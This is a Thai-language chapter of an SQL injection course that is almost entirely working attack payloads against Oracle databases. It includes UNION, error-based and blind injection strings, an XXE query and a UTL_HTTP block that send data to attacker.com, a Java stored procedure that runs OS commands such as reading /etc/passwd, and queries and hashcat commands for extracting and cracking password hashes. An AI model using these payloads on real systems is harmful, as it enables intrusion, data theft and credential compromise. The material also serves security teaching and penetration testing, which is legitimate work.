# Part 041: Oracle Database Advanced Exploitation

## ภาพรวม

Oracle Database มีเทคนิคพิเศษสำหรับการ exploit ที่แตกต่างจาก MySQL/MSSQL/PostgreSQL

**ขั้นตอนที่ 621-640**

---

## 621. Oracle Enumeration

```sql
-- Version
SELECT * FROM v$version;
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';

-- Current user
SELECT user FROM dual;
SELECT sys_context('USERENV','SESSION_USER') FROM dual;

-- Databases (schemas)
SELECT DISTINCT owner FROM all_tables;
SELECT username FROM all_users;

-- Tables
SELECT table_name FROM all_tables WHERE owner='HR';
SELECT table_name FROM user_tables;

-- Columns
SELECT column_name, data_type FROM all_tab_columns 
WHERE table_name='EMPLOYEES' AND owner='HR';

-- Privileges
SELECT * FROM user_sys_privs;
SELECT * FROM user_role_privs;
SELECT * FROM session_privs;
```

---

## 622. Oracle UNION Injection

```sql
-- ความแตกต่าง: ต้องมี FROM clause
SELECT 1 FROM dual;  -- ใช้ FROM dual

-- หา column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3-- (error)

' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--

-- หา string columns
' UNION SELECT 'a',NULL FROM dual--
' UNION SELECT NULL,'a' FROM dual--

-- Extract version
' UNION SELECT banner,NULL FROM v$version--

-- Extract users
' UNION SELECT username,password FROM all_users--

-- Extract tables
' UNION SELECT table_name,NULL FROM all_tables WHERE rownum=1--
```

---

## 623. Oracle Error-Based Injection

```sql
-- UTL_INADDR.GET_HOST_ADDRESS (DNS lookup + error)
SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM dual;

-- CTXSYS.DRITHSX.SN error
' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--

-- xmltype error
' AND 1=XMLTYPE((SELECT XMLELEMENT(x,(SELECT user FROM dual)).GETSTRINGVAL() FROM dual))--

-- ดึง version
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/?v='||(SELECT banner FROM v$version WHERE rownum=1)||'"> %remote;]>'),'/l') FROM dual;
```

---

## 624. Oracle Blind Injection

```sql
-- Boolean
' AND 1=(SELECT 1 FROM dual WHERE (SELECT user FROM dual)='SYS')--

-- Substr
' AND 1=(SELECT 1 FROM dual WHERE SUBSTR((SELECT user FROM dual),1,1)='S')--

-- Time-based (DBMS_PIPE)
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

-- จำนวนเต็ม LIMIT ใช้ ROWNUM
SELECT table_name FROM all_tables WHERE rownum=1;
SELECT table_name FROM all_tables WHERE rownum<=5;
SELECT * FROM (SELECT t.*,rownum rn FROM all_tables t) WHERE rn=2;
```

---

## 625. Oracle Java Stored Procedures

```sql
-- ต้องการ JAVA และ JAVASYSPRIV privileges

-- สร้าง Java class
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "RunOS" AS
import java.io.*;
import java.util.*;
public class RunOS {
    public static String exec(String cmd) throws IOException {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line + "\n");
        return sb.toString();
    }
};
/

-- Wrapper function
CREATE OR REPLACE FUNCTION exec_cmd(cmd VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME 'RunOS.exec(java.lang.String) return java.lang.String';
/

-- Usage
SELECT exec_cmd('id') FROM dual;
SELECT exec_cmd('cat /etc/passwd') FROM dual;
SELECT exec_cmd('whoami') FROM dual;

-- ทำความสะอาด
DROP FUNCTION exec_cmd;
```

---

## 626. Oracle UTL_HTTP Exfiltration

```sql
-- ส่งข้อมูลผ่าน HTTP
DECLARE
  l_http_request   UTL_HTTP.req;
  l_data           VARCHAR2(200);
BEGIN
  SELECT user INTO l_data FROM dual;
  l_http_request := UTL_HTTP.begin_request(
    'http://attacker.com/?data=' || l_data
  );
  UTL_HTTP.end_request(l_http_request);
EXCEPTION WHEN OTHERS THEN NULL;
END;
/

-- ผ่าน injection
' ; BEGIN UTL_HTTP.request('http://attacker.com/?v='||(SELECT user FROM dual)); END;--
```

---

## 627. Oracle Password Cracking

```sql
-- Oracle 11g passwords (DES-based)
SELECT username, password FROM dba_users;

-- Oracle 12c+ (SHA512)
SELECT username, spare4 FROM sys.user$ WHERE type#=1;
-- spare4 คือ S:HASH

-- ใช้ hashcat สำหรับ crack
hashcat -m 112 oracle_hashes.txt rockyou.txt   -- Oracle H
hashcat -m 12300 oracle_hashes.txt rockyou.txt  -- Oracle T (11g)
```

---

## สรุป

Oracle Advanced:
- **Enumeration** - all_tables, all_tab_columns, v$version
- **UNION** - ต้องมี FROM dual
- **Error-based** - UTL_INADDR, xmltype
- **Java** - OS command execution
- **UTL_HTTP** - HTTP exfiltration

---

*Part 041 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
